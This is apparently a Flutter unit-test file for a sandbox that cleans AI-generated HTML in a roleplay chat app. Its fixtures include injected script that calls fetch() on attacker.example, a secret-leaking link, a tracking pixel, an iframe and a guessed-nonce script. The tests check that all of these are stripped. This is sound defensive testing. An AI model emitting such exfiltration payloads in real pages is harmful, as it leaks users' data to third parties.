import 'package:ai_roleplay_chat/services/runnable_html_sandbox.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  test('removes model executable content and external navigation', () {
    final result = RunnableHtmlSandbox.build(
      document: '''
<style>.panel { color: red; }</style>
<script>fetch('https://attacker.example/steal')</script>
<button onclick="steal()" data-action="继续">继续</button>
<a href="https://attacker.example/?secret=x">外链</a>
<img src="https://attacker.example/pixel.png">
<img src="data:image/png;base64,AAAA">
<iframe src="https://attacker.example"></iframe>
''',
      trustedBridgeScript: 'window.parent.postMessage("trusted", "*");',
    );

    expect(result, contains('Content-Security-Policy'));
    expect(result, contains("connect-src 'none'"));
    expect(result, contains("form-action 'none'"));
    expect(result, isNot(contains('fetch(')));
    expect(result, isNot(contains('onclick=')));
    expect(result, isNot(contains('attacker.example')));
    expect(result, isNot(contains('<iframe')));
    expect(result, contains('data-action="继续"'));
    expect(result, contains('data:image/png;base64,AAAA'));
    expect(result, contains('window.parent.postMessage'));
  });

  test('only the trusted bridge receives the generated CSP nonce', () {
    final result = RunnableHtmlSandbox.build(
      document: '<script nonce="guessed">alert(1)</script><p>正文</p>',
      trustedBridgeScript: 'document.body.dataset.ready = "true";',
    );

    final nonceMatch = RegExp(r"script-src 'nonce-([^']+)'").firstMatch(result);
    final nonce = nonceMatch?.group(1);
    expect(nonceMatch, isNotNull);
    expect(nonce, isNotEmpty);
    expect(result, contains('<script nonce="$nonce">'));
    expect(RegExp(r'<script\b').allMatches(result), hasLength(1));
    expect(result, isNot(contains('guessed')));
    expect(result, isNot(contains('alert(1)')));
  });
}
